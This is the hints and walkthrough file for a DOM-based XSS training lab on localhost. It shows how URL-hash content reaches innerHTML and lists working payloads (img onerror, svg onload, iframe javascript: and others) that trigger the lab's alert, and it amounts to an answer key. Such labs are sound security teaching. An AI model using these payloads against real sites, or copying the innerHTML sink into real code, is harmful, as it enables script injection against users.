# DOM Hash XSS Lab - Hints

## 🎯 Objective

Trigger an XSS attack using the URL fragment (hash) and retrieve the flag. The flag will appear in an alert when you successfully execute JavaScript with the message `XSS_SUCCESS`.

---

## 💡 Progressive Hints

### Level 1 - Understanding the Application ✅

**What you need to discover:**
1. The page displays whatever is after the `#` in the URL
2. This is called the "fragment" or "hash" part of the URL
3. The value is accessed via `location.hash` in JavaScript

**Test this:**
- Visit: `http://localhost:8019/#hello`
- What do you see displayed?

---

### Level 2 - Finding HTML Injection ✅

**What you need to discover:**
1. HTML tags in the hash are rendered, not displayed as text
2. This happens because the code uses `innerHTML`

**Test this:**
- Visit: `http://localhost:8019/#<b>bold</b>`
- Is the text bold?
- Try: `#<i>italic</i>`, `#<u>underline</u>`

**What this means:**
The page is vulnerable to HTML injection! You can insert any HTML tag.

---

### Level 3 - Understanding innerHTML ✅

**The vulnerable code:**
```javascript
displayElement.innerHTML = hashContent;
```

**Why this is dangerous:**
- `innerHTML` parses and renders HTML
- Event handlers in HTML are executed
- JavaScript in attributes runs automatically

**Example:**
```html
<img src=x onerror="alert('hacked')">
```
When `onerror` triggers (because `src=x` fails), it executes the JavaScript!

---

### Level 4 - Identifying the Trigger ✅

**The validation mechanism:**
The lab expects your payload to call `alert('XSS_SUCCESS')`.

**How to trigger the flag:**
1. Your payload must execute JavaScript
2. It must call `alert()` with exactly `XSS_SUCCESS`
3. The validation intercepts this call and shows the flag

**Console hint:**
Open browser DevTools (F12) and check the console for clues!

---

### Level 5 - Crafting the Payload ✅

**Step-by-step payload construction:**

1. **Start with an image tag:**
   ```html
   <img src=x>
   ```

2. **Add an error handler:**
   ```html
   <img src=x onerror="alert('test')">
   ```

3. **Replace with the trigger:**
   ```html
   <img src=x onerror="alert('XSS_SUCCESS')">
   ```

4. **URL-encode if needed (or let browser do it):**
   ```
   #<img src=x onerror="alert('XSS_SUCCESS')">
   ```

---

### Level 6 - Executing the Exploit ✅

**Complete URL:**
```
http://localhost:8019/#<img src=x onerror="alert('XSS_SUCCESS')">
```

**What happens:**
1. Page loads
2. JavaScript reads `location.hash` (everything after `#`)
3. Decodes the URL encoding
4. Inserts into `innerHTML`
5. Browser parses the `<img>` tag
6. Tries to load image from `src="x"` → fails
7. Triggers `onerror` handler
8. Executes `alert('XSS_SUCCESS')`
9. Validation catches this and shows the flag!

---

## 🔧 Alternative Payloads

All of these will work:

### Using SVG:
```
#<svg onload="alert('XSS_SUCCESS')">
```

### Using Body:
```
#<body onload="alert('XSS_SUCCESS')">
```

### Using Details/Summary (requires click):
```
#<details open ontoggle="alert('XSS_SUCCESS')">
```

### Using Iframe:
```
#<iframe src="javascript:alert('XSS_SUCCESS')">
```

---

## 🐛 Troubleshooting

### Problem: HTML shows as text instead of rendering

**Solution:** Make sure you're putting the payload AFTER the `#` in the URL, not in a form field.

❌ Wrong: Typing in search box
✅ Right: In the URL bar after `#`

---

### Problem: Alert doesn't show flag

**Solution:** Make sure you're using exactly `XSS_SUCCESS` (case-sensitive):

❌ Wrong: `alert('xss_success')`
❌ Wrong: `alert('success')`
✅ Right: `alert('XSS_SUCCESS')`

---

### Problem: Browser URL-encodes the characters

**Solution:** This is normal! The lab decodes them automatically. Just type the payload normally:

```
#<img src=x onerror="alert('XSS_SUCCESS')">
```

Modern browsers will handle the encoding automatically.

---

### Problem: Image doesn't trigger error handler

**Solution:** Use an invalid source like:
- `src=x` (x is not a valid URL)
- `src=''` (empty string might work)
- `src=//` (invalid protocol)

The key is making the image fail to load, which triggers `onerror`.

---

## 🎓 Quick Reference

| Component | Value |
|-----------|-------|
| **Source** | `location.hash` |
| **Sink** | `innerHTML` |
| **Trigger** | `alert('XSS_SUCCESS')` |
| **Key Tag** | `<img onerror="...">` |
| **Key Attribute** | `src="x"` (invalid) |

---

## 📝 Cheat Sheet

**Copy-paste this URL:**
```
http://localhost:8019/#<img src=x onerror="alert('XSS_SUCCESS')">
```

**Or just append to current URL:**
```
#<img src=x onerror="alert('XSS_SUCCESS')">
```

---

## 🏆 Success Indicator

You'll know you succeeded when you see:
```
🎯 FLAG: IDS{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

The flag changes each time the server restarts, so get it while you can!

---

**Good luck! 🚀**
